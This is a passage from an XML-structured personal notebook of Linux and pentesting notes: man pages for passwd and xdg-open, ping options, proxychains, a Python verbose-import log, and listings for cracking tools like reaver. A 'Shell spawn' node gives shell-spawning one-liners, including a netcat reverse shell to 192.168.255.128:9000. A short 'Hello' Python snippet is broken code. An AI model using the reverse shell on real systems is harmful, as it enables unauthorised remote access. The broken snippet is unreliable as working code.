          <rich_text link="webs http://www.freedesktop.org/'">http://www.freedesktop.org/'</rich_text>
          <rich_text>

       Opens the freedesktop.org website in the user's default browser.

           xdg-open /tmp/foobar.png

       Opens the PNG image file /tmp/foobar.png in the user's default image viewing
       application.

AUTHORS
       Kevin Krammer
           Author.

       Jeremy White
           Author.

COPYRIGHT
       Copyright © 2006

NOTES
        1. MIME applications associations specification
           </rich_text>
          <rich_text link="webs http://www.freedesktop.org/wiki/Specifications/mime-apps-spec/">http://www.freedesktop.org/wiki/Specifications/mime-apps-spec/</rich_text>
          <rich_text>

xdg-utils 1.0
04/25/2021</rich_text>
        </node>
        <node name="whatis" unique_id="328" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724698031" ts_lastsave="1724698032">
          <rich_text>open (1)             - opens a file or URL in the user's preferred application
open (2)             - open and possibly create a file
</rich_text>
        </node>
      </node>
      <node name="openssl" unique_id="250" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685695482" ts_lastsave="1728580979">
        <rich_text scale="h1" weight="heavy">openssl</rich_text>
        <rich_text>
openssl (1ssl)       - OpenSSL command line program


</rich_text>
        <rich_text scale="h3">• </rich_text>
        <rich_text scale="h3" weight="heavy">Create hashed text </rich_text>
        <rich_text foreground="#9a9a99999696">(see </rich_text>
        <rich_text foreground="#9a9a99999696" weight="heavy">echo</rich_text>
        <rich_text foreground="#9a9a99999696">, </rich_text>
        <rich_text foreground="#9a9a99999696" weight="heavy">ssh-key</rich_text>
        <rich_text foreground="#9a9a99999696"> too)</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">$ openssl passwd -1 </rich_text>
        <rich_text underline="single">newPass</rich_text>
      </node>
      <node name="owasp" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283612" ts_lastsave="1685695482"/>
      <node name="pacman" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284975" ts_lastsave="1684284978"/>
      <node name="passwd" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284532" ts_lastsave="1724700478">
        <rich_text scale="h1" weight="heavy">passwd</rich_text>
        <rich_text>

# Execution
$ </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">passwd</rich_text>
        <rich_text> [</rich_text>
        <rich_text foreground="#777776767b7b">options</rich_text>
        <rich_text>] [</rich_text>
        <rich_text foreground="#777776767b7b">LOGIN</rich_text>
        <rich_text>]

# passwords locations: " /etc/passwd "
# shadow of passwords locations: " /etc/shadow "</rich_text>
        <node name="man" unique_id="332" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724700053" ts_lastsave="1724700054">
          <rich_text>PASSWD(1)                              User Commands                             PASSWD(1)

NAME
       passwd - change user password

SYNOPSIS

       passwd [options] [LOGIN]

DESCRIPTION
       The passwd command changes passwords for user accounts. A normal user may only
       change the password for their own account, while the superuser may change the
       password for any account.  passwd also changes the account or associated password
       validity period.

   Password Changes
       The user is first prompted for their old password, if one is present. This password
       is then encrypted and compared against the stored password. The user has only one
       chance to enter the correct password. The superuser is permitted to bypass this
       step so that forgotten passwords may be changed.

       After the password has been entered, password aging information is checked to see
       if the user is permitted to change the password at this time. If not, passwd
       refuses to change the password and exits.

       The user is then prompted twice for a replacement password. The second entry is
       compared against the first and both are required to match in order for the password
       to be changed.

       Then, the password is tested for complexity. As a general guideline, passwords
       should consist of 6 to 8 characters including one or more characters from each of
       the following sets:

       •   lower case alphabetics

       •   digits 0 thru 9

       •   punctuation marks

       Care must be taken not to include the system default erase or kill characters.
       passwd will reject any password which is not suitably complex.

   Hints for user passwords
       The security of a password depends upon the strength of the encryption algorithm
       and the size of the key space. The legacy UNIX System encryption method is based on
       the NBS DES algorithm. More recent methods are now recommended (see
       ENCRYPT_METHOD). The size of the key space depends upon the randomness of the
       password which is selected.

       Compromises in password security normally result from careless password selection
       or handling. For this reason, you should not select a password which appears in a
       dictionary or which must be written down. The password should also not be a proper
       name, your license number, birth date, or street address. Any of these may be used
       as guesses to violate system security.

       You can find advice on how to choose a strong password on
       </rich_text>
          <rich_text link="webs http://en.wikipedia.org/wiki/Password_strength">http://en.wikipedia.org/wiki/Password_strength</rich_text>
          <rich_text>

OPTIONS
       The options which apply to the passwd command are:

       -a, --all
           This option can be used only with -S and causes show status for all users.

       -d, --delete
           Delete a user's password (make it empty). This is a quick way to disable a
           password for an account. It will set the named account passwordless.

       -e, --expire
           Immediately expire an account's password. This in effect can force a user to
           change their password at the user's next login.

       -h, --help
           Display help message and exit.

       -i, --inactive INACTIVE
           This option is used to disable an account after the password has been expired
           for a number of days. After a user account has had an expired password for
           INACTIVE days, the user may no longer sign on to the account.

       -k, --keep-tokens
           Indicate password change should be performed only for expired authentication
           tokens (passwords). The user wishes to keep their non-expired tokens as before.

       -l, --lock
           Lock the password of the named account. This option disables a password by
           changing it to a value which matches no possible encrypted value (it adds a ´!´
           at the beginning of the password).

           Note that this does not disable the account. The user may still be able to
           login using another authentication token (e.g. an SSH key). To disable the
           account, administrators should use usermod --expiredate 1 (this set the
           account's expire date to Jan 2, 1970).

           Users with a locked password are not allowed to change their password.

       -n, --mindays MIN_DAYS
           Set the minimum number of days between password changes to MIN_DAYS. A value of
           zero for this field indicates that the user may change their password at any
           time.

       -q, --quiet
           Quiet mode.

       -r, --repository REPOSITORY
           change password in REPOSITORY repository

       -R, --root CHROOT_DIR
           Apply changes in the CHROOT_DIR directory and use the configuration files from
           the CHROOT_DIR directory. Only absolute paths are supported.

       -S, --status
           Display account status information. The status information consists of 7
           fields. The first field is the user's login name. The second field indicates if
           the user account has a locked password (L), has no password (NP), or has a
           usable password (P). The third field gives the date of the last password
           change. The next four fields are the minimum age, maximum age, warning period,
           and inactivity period for the password. These ages are expressed in days.

       -u, --unlock
           Unlock the password of the named account. This option re-enables a password by
           changing the password back to its previous value (to the value before using the
           -l option).

       -w, --warndays WARN_DAYS
           Set the number of days of warning before a password change is required. The
           WARN_DAYS option is the number of days prior to the password expiring that a
           user will be warned that their password is about to expire.

       -x, --maxdays MAX_DAYS
           Set the maximum number of days a password remains valid. After MAX_DAYS, the
           password is required to be changed.

           Passing the number -1 as MAX_DAYS will remove checking a password's validity.

CAVEATS
       Password complexity checking may vary from site to site. The user is urged to
       select a password as complex as he or she feels comfortable with.

       Users may not be able to change their password on a system if NIS is enabled and
       they are not logged into the NIS server.

       passwd uses PAM to authenticate users and to change their passwords.

FILES
       /etc/passwd
           User account information.

       /etc/shadow
           Secure user account information.

       /etc/pam.d/passwd
           PAM configuration for passwd.

EXIT VALUES
       The passwd command exits with the following values:

       0
           success

       1
           permission denied

       2
           invalid combination of options

       3
           unexpected failure, nothing done

       4
           unexpected failure, passwd file missing

       5
           passwd file busy, try again

       6
           invalid argument to option

SEE ALSO
       chpasswd(8), passwd(5), shadow(5), usermod(8).

shadow-utils 4.13                       01/06/2024                               PASSWD(1)
</rich_text>
        </node>
        <node name="whatis" unique_id="331" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724699963" ts_lastsave="1724699964">
          <rich_text>passwd (1)           - change user password
passwd (1ssl)        - OpenSSL application commands
passwd (5)           - the password file</rich_text>
        </node>
      </node>
      <node name="patator" unique_id="197" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285983" ts_lastsave="1684285988"/>
      <node name="ping" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284058" ts_lastsave="1724707292">
        <rich_text scale="h1">ping</rich_text>
        <rich_text>

	ping [options] &lt;destination&gt;
	
	options:
	-c &lt;count&gt;         stop after &lt;count&gt; replies
</rich_text>
        <node name="--help" unique_id="335" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724707292" ts_lastsave="1724707380">
          <rich_text>Usage
  ping [options] &lt;destination&gt;

Options:
  &lt;destination&gt;      dns name or ip address
  -a                 use audible ping
  -A                 use adaptive ping
  -B                 sticky source address
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">  -c &lt;count&gt;         stop after &lt;count&gt; replies</rich_text>
          <rich_text>
  -C                 call connect() syscall on socket creation
  -D                 print timestamps
  -d                 use SO_DEBUG socket option
  -e &lt;identifier&gt;    define identifier for ping session, default is random for
                     SOCK_RAW and kernel defined for SOCK_DGRAM
                     Imply using SOCK_RAW (for IPv4 only for identifier 0)
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">  -f                 flood ping</rich_text>
          <rich_text>
  -h                 print help and exit
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">  -I &lt;interface&gt;     either interface name or address
  -i &lt;interval&gt;      seconds between sending each packet</rich_text>
          <rich_text>
  -L                 suppress loopback of multicast packets
  -l &lt;preload&gt;       send &lt;preload&gt; number of packages while waiting replies
  -m &lt;mark&gt;          tag the packets going out
  -M &lt;pmtud opt&gt;     define mtu discovery, can be one of &lt;do|dont|want&gt;
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">  -n                 no dns name resolution</rich_text>
          <rich_text>
  -O                 report outstanding replies
  -p &lt;pattern&gt;       contents of padding byte
  -q                 quiet output
  -Q &lt;tclass&gt;        use quality of service &lt;tclass&gt; bits
  -s &lt;size&gt;          use &lt;size&gt; as number of data bytes to be sent
  -S &lt;size&gt;          use &lt;size&gt; as SO_SNDBUF socket option value
  -t &lt;ttl&gt;           define time to live
  -U                 print user-to-user latency
  -v                 verbose output
  -V                 print version and exit
  -w &lt;deadline&gt;      reply wait &lt;deadline&gt; in seconds
  -W &lt;timeout&gt;       time to wait for response

IPv4 options:
  -4                 use IPv4
  -b                 allow pinging broadcast
  -R                 record route
  -T &lt;timestamp&gt;     define timestamp, can be one of &lt;tsonly|tsandaddr|tsprespec&gt;

IPv6 options:
  -6                 use IPv6
  -F &lt;flowlabel&gt;     define flow label, default is random
  -N &lt;nodeinfo opt&gt;  use icmp6 node info query, try &lt;help&gt; as argument

For more details see ping(8).</rich_text>
        </node>
      </node>
      <node name="proxychains" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283799" ts_lastsave="1718595498">
        <rich_text scale="h2">Path</rich_text>
        <rich_text>
/etc/proxychains4.conf

</rich_text>
        <rich_text scale="h2">Command</rich_text>
        <rich_text>
proxychains &lt;command&gt;
</rich_text>
      </node>
      <node name="ps" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284440" ts_lastsave="1695267028">
        <rich_text>ps (1)               - report a snapshot of the current processes.
</rich_text>
      </node>
      <node name="pwd" unique_id="186" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285818" ts_lastsave="1695267015">
        <rich_text>pwd (1)              - print name of current/working directory
</rich_text>
      </node>
      <node name="python3" unique_id="249" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685692861" ts_lastsave="1728582397">
        <rich_text scale="h1" weight="heavy">Python v3.x</rich_text>
        <rich_text>

</rich_text>
        <rich_text family="monospace" foreground="#2e2ec2c27e7e">$ python3
$ python
$ py</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">• </rich_text>
        <rich_text scale="h2" weight="heavy">older version</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace" foreground="#2e2ec2c27e7e">$ python2</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">• </rich_text>
        <rich_text scale="h2" weight="heavy">version</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace" foreground="#2e2ec2c27e7e">$ python -v</rich_text>
        <rich_text>
</rich_text>
        <rich_text style="italic" foreground="#9a9a99999696">Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.</rich_text>
        <node name="-v" unique_id="350" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724981270" ts_lastsave="1728582406">
          <rich_text family="monospace" foreground="#2e2ec2c27e7e">$ python -v</rich_text>
          <rich_text>

import _frozen_importlib # frozen
import _imp # builtin
import '_thread' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import '_warnings' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import '_weakref' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import '_io' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'marshal' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'posix' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import '_frozen_importlib_external' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
# installing zipimport hook
import 'time' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'zipimport' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
# installed zipimport hook
# /usr/lib/python3.11/encodings/__pycache__/__init__.cpython-311.pyc matches /usr/lib/python3.11/encodings/__init__.py
# code object from '/usr/lib/python3.11/encodings/__pycache__/__init__.cpython-311.pyc'
import '_codecs' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'codecs' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
# /usr/lib/python3.11/encodings/__pycache__/aliases.cpython-311.pyc matches /usr/lib/python3.11/encodings/aliases.py
# code object from '/usr/lib/python3.11/encodings/__pycache__/aliases.cpython-311.pyc'
import 'encodings.aliases' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f9c5f10&gt;
import 'encodings' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f9b6350&gt;
# /usr/lib/python3.11/encodings/__pycache__/utf_8.cpython-311.pyc matches /usr/lib/python3.11/encodings/utf_8.py
# code object from '/usr/lib/python3.11/encodings/__pycache__/utf_8.cpython-311.pyc'
import 'encodings.utf_8' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f9b7d10&gt;
import '_signal' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import '_abc' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'abc' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
import 'io' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
import '_stat' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'stat' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
import '_collections_abc' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
import 'genericpath' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
import 'posixpath' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
import 'os' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
import '_sitebuiltins' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
Processing user site-packages
Adding directory: '/home/nightfox/.local/lib/python3.11/site-packages'
Processing global site-packages
Adding directory: '/usr/local/lib/python3.11/dist-packages'
Adding directory: '/usr/lib/python3/dist-packages'
Processing .pth file: '/usr/lib/python3/dist-packages/PasteScript-3.2.1-nspkg.pth'
# /usr/lib/python3.11/__pycache__/types.cpython-311.pyc matches /usr/lib/python3.11/types.py
# code object from '/usr/lib/python3.11/__pycache__/types.cpython-311.pyc'
import 'types' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f790790&gt;
# /usr/lib/python3.11/importlib/__pycache__/__init__.cpython-311.pyc matches /usr/lib/python3.11/importlib/__init__.py
# code object from '/usr/lib/python3.11/importlib/__pycache__/__init__.cpython-311.pyc'
# /usr/lib/python3.11/__pycache__/warnings.cpython-311.pyc matches /usr/lib/python3.11/warnings.py
# code object from '/usr/lib/python3.11/__pycache__/warnings.cpython-311.pyc'
import 'warnings' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f7922d0&gt;
import 'importlib' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f790b10&gt;
# /usr/lib/python3.11/importlib/__pycache__/_abc.cpython-311.pyc matches /usr/lib/python3.11/importlib/_abc.py
# code object from '/usr/lib/python3.11/importlib/__pycache__/_abc.cpython-311.pyc'
import 'importlib._abc' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f7bc510&gt;
# /usr/lib/python3.11/__pycache__/contextlib.cpython-311.pyc matches /usr/lib/python3.11/contextlib.py
# code object from '/usr/lib/python3.11/__pycache__/contextlib.cpython-311.pyc'
# /usr/lib/python3.11/collections/__pycache__/__init__.cpython-311.pyc matches /usr/lib/python3.11/collections/__init__.py
# code object from '/usr/lib/python3.11/collections/__pycache__/__init__.cpython-311.pyc'
import 'itertools' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
# /usr/lib/python3.11/__pycache__/keyword.cpython-311.pyc matches /usr/lib/python3.11/keyword.py
# code object from '/usr/lib/python3.11/__pycache__/keyword.cpython-311.pyc'
import 'keyword' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f7d5ed0&gt;
# /usr/lib/python3.11/__pycache__/operator.cpython-311.pyc matches /usr/lib/python3.11/operator.py
# code object from '/usr/lib/python3.11/__pycache__/operator.cpython-311.pyc'
import '_operator' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'operator' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f7d69d0&gt;
# /usr/lib/python3.11/__pycache__/reprlib.cpython-311.pyc matches /usr/lib/python3.11/reprlib.py
# code object from '/usr/lib/python3.11/__pycache__/reprlib.cpython-311.pyc'
import 'reprlib' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f7d7690&gt;
import '_collections' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'collections' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f7bce90&gt;
# /usr/lib/python3.11/__pycache__/functools.cpython-311.pyc matches /usr/lib/python3.11/functools.py
# code object from '/usr/lib/python3.11/__pycache__/functools.cpython-311.pyc'
import '_functools' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'functools' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f7c0690&gt;
import 'contextlib' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f7bc650&gt;
import 'importlib.util' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
import 'importlib.machinery' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
Processing .pth file: '/usr/lib/python3/dist-packages/distutils-precedence.pth'
# /usr/lib/python3/dist-packages/_distutils_hack/__pycache__/__init__.cpython-311.pyc matches /usr/lib/python3/dist-packages/_distutils_hack/__init__.py
# code object from '/usr/lib/python3/dist-packages/_distutils_hack/__pycache__/__init__.cpython-311.pyc'
import '_distutils_hack' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f82a7d0&gt;
Processing .pth file: '/usr/lib/python3/dist-packages/google_auth-1.5.1-nspkg.pth'
# possible namespace for /usr/lib/python3/dist-packages/google
Processing .pth file: '/usr/lib/python3/dist-packages/logilab_common-1.9.8-nspkg.pth'
# possible namespace for /usr/lib/python3/dist-packages/logilab
Processing .pth file: '/usr/lib/python3/dist-packages/matplotlib-3.6.3-nspkg.pth'
Processing .pth file: '/usr/lib/python3/dist-packages/repoze.lru-0.7-nspkg.pth'
# possible namespace for /usr/lib/python3/dist-packages/repoze
Processing .pth file: '/usr/lib/python3/dist-packages/ruamel.yaml-0.17.21-nspkg.pth'
# possible namespace for /usr/lib/python3/dist-packages/ruamel
Processing .pth file: '/usr/lib/python3/dist-packages/zc.lockfile-2.0-nspkg.pth'
# possible namespace for /usr/lib/python3/dist-packages/zc
Processing .pth file: '/usr/lib/python3/dist-packages/zope.deprecation-5.0-nspkg.pth'
Processing .pth file: '/usr/lib/python3/dist-packages/zope.event-5.0-nspkg.pth'
# destroy zope
Processing .pth file: '/usr/lib/python3/dist-packages/zope.interface-6.1-nspkg.pth'
# destroy zope
Adding directory: '/usr/lib/python3.11/dist-packages'
# /usr/lib/python3.11/__pycache__/sitecustomize.cpython-311.pyc matches /usr/lib/python3.11/sitecustomize.py
# code object from '/usr/lib/python3.11/__pycache__/sitecustomize.cpython-311.pyc'
import 'sitecustomize' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f838a50&gt;
import 'site' # &lt;class '_frozen_importlib.FrozenImporter'&gt;
# extension module 'readline' loaded from '/usr/lib/python3.11/lib-dynload/readline.cpython-311-x86_64-linux-gnu.so'
# extension module 'readline' executed from '/usr/lib/python3.11/lib-dynload/readline.cpython-311-x86_64-linux-gnu.so'
import 'readline' # &lt;_frozen_importlib_external.ExtensionFileLoader object at 0x7fec5f8389d0&gt;
# /usr/lib/python3.11/__pycache__/rlcompleter.cpython-311.pyc matches /usr/lib/python3.11/rlcompleter.py
# code object from '/usr/lib/python3.11/__pycache__/rlcompleter.cpython-311.pyc'
import 'atexit' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
# /usr/lib/python3.11/__pycache__/inspect.cpython-311.pyc matches /usr/lib/python3.11/inspect.py
# code object from '/usr/lib/python3.11/__pycache__/inspect.cpython-311.pyc'
# /usr/lib/python3.11/__pycache__/ast.cpython-311.pyc matches /usr/lib/python3.11/ast.py
# code object from '/usr/lib/python3.11/__pycache__/ast.cpython-311.pyc'
import '_ast' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
# /usr/lib/python3.11/__pycache__/enum.cpython-311.pyc matches /usr/lib/python3.11/enum.py
# code object from '/usr/lib/python3.11/__pycache__/enum.cpython-311.pyc'
import 'enum' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f5cf2d0&gt;
import 'ast' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f84df90&gt;
# /usr/lib/python3.11/__pycache__/dis.cpython-311.pyc matches /usr/lib/python3.11/dis.py
# code object from '/usr/lib/python3.11/__pycache__/dis.cpython-311.pyc'
# /usr/lib/python3.11/__pycache__/opcode.cpython-311.pyc matches /usr/lib/python3.11/opcode.py
# code object from '/usr/lib/python3.11/__pycache__/opcode.cpython-311.pyc'
import '_opcode' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
import 'opcode' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f5ffa10&gt;
import 'dis' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f85d0d0&gt;
# /usr/lib/python3.11/collections/__pycache__/abc.cpython-311.pyc matches /usr/lib/python3.11/collections/abc.py
# code object from '/usr/lib/python3.11/collections/__pycache__/abc.cpython-311.pyc'
import 'collections.abc' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f5fd590&gt;
# /usr/lib/python3.11/__pycache__/linecache.cpython-311.pyc matches /usr/lib/python3.11/linecache.py
# code object from '/usr/lib/python3.11/__pycache__/linecache.cpython-311.pyc'
# /usr/lib/python3.11/__pycache__/tokenize.cpython-311.pyc matches /usr/lib/python3.11/tokenize.py
# code object from '/usr/lib/python3.11/__pycache__/tokenize.cpython-311.pyc'
# /usr/lib/python3.11/re/__pycache__/__init__.cpython-311.pyc matches /usr/lib/python3.11/re/__init__.py
# code object from '/usr/lib/python3.11/re/__pycache__/__init__.cpython-311.pyc'
# /usr/lib/python3.11/re/__pycache__/_compiler.cpython-311.pyc matches /usr/lib/python3.11/re/_compiler.py
# code object from '/usr/lib/python3.11/re/__pycache__/_compiler.cpython-311.pyc'
import '_sre' # &lt;class '_frozen_importlib.BuiltinImporter'&gt;
# /usr/lib/python3.11/re/__pycache__/_parser.cpython-311.pyc matches /usr/lib/python3.11/re/_parser.py
# code object from '/usr/lib/python3.11/re/__pycache__/_parser.cpython-311.pyc'
# /usr/lib/python3.11/re/__pycache__/_constants.cpython-311.pyc matches /usr/lib/python3.11/re/_constants.py
# code object from '/usr/lib/python3.11/re/__pycache__/_constants.cpython-311.pyc'
import 're._constants' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f639f90&gt;
import 're._parser' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f62af50&gt;
# /usr/lib/python3.11/re/__pycache__/_casefix.cpython-311.pyc matches /usr/lib/python3.11/re/_casefix.py
# code object from '/usr/lib/python3.11/re/__pycache__/_casefix.cpython-311.pyc'
import 're._casefix' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f645910&gt;
import 're._compiler' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f623910&gt;
# /usr/lib/python3.11/__pycache__/copyreg.cpython-311.pyc matches /usr/lib/python3.11/copyreg.py
# code object from '/usr/lib/python3.11/__pycache__/copyreg.cpython-311.pyc'
import 'copyreg' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f646c50&gt;
import 're' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f622010&gt;
# /usr/lib/python3.11/__pycache__/token.cpython-311.pyc matches /usr/lib/python3.11/token.py
# code object from '/usr/lib/python3.11/__pycache__/token.cpython-311.pyc'
import 'token' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f622a90&gt;
import 'tokenize' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f612f90&gt;
import 'linecache' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f5fd510&gt;
import 'inspect' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f8397d0&gt;
import 'rlcompleter' # &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fec5f838ed0&gt;
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.</rich_text>
        </node>
        <node name="Hello" unique_id="348" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724980748" ts_lastsave="1724981104">
          <rich_text family="monospace">from random import random as rnd
from time import sleep as delay


def main():
	for _char in range('Hello'):
		print(_char ,end='')
		delay(1)


if name == ‘__main__’:
	main()
</rich_text>
        </node>
        <node name="Shell spawn" unique_id="349" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724980875" ts_lastsave="1729094826">
          <rich_text scale="h1" weight="heavy">Python Spawning Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#9a9a99999696">#1</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">$ python -c 'import pty; pty.spawn("/bin/sh")'
</rich_text>
          <rich_text family="monospace" foreground="#9a9a99999696" weight="heavy">
</rich_text>
          <rich_text family="monospace" foreground="#9a9a99999696">#2</rich_text>
          <rich_text family="monospace">
$ python -c 'import os;	os.system("/bin/sh")'</rich_text>
          <rich_text>

#netcat
</rich_text>
          <rich_text family="monospace">python3 -c 'import os; os.system("nc 192.168.255.128 9000 -e /bin/sh")'</rich_text>
        </node>
        <node name="http server" unique_id="386" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728545633" ts_lastsave="1729179735">
          <rich_text scale="h1">http.server</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">$ python3 -m http.server &lt;port&gt;</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">$ python3 -m http.server -h</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">simple_http_server</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">$ python3 -m simple_http_server</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">$ python3 -m simple_http_server -h</rich_text>
          <rich_text>

</rich_text>
        </node>
      </node>
      <node name="rb" unique_id="389" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728579725" ts_lastsave="1728579789">
        <rich_text scale="h1" weight="heavy">rb</rich_text>
        <rich_text>
ruby script

Execute:
</rich_text>
        <rich_text foreground="#5757e3e38989">$ ruby test.rb</rich_text>
      </node>
      <node name="reaver" unique_id="231" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287543" ts_lastsave="1695267042">
        <rich_text>reaver (1)           - WPS Cracker</rich_text>
      </node>
      <node name="reboot" unique_id="151" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285385" ts_lastsave="1695267055">
        <rich_text>reboot (2)           - reboot or enable/disable Ctrl-Alt-Del
reboot (8)           - Halt, power-off or reboot the machine
</rich_text>
      </node>
      <node name="rm" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285136" ts_lastsave="1728579725">
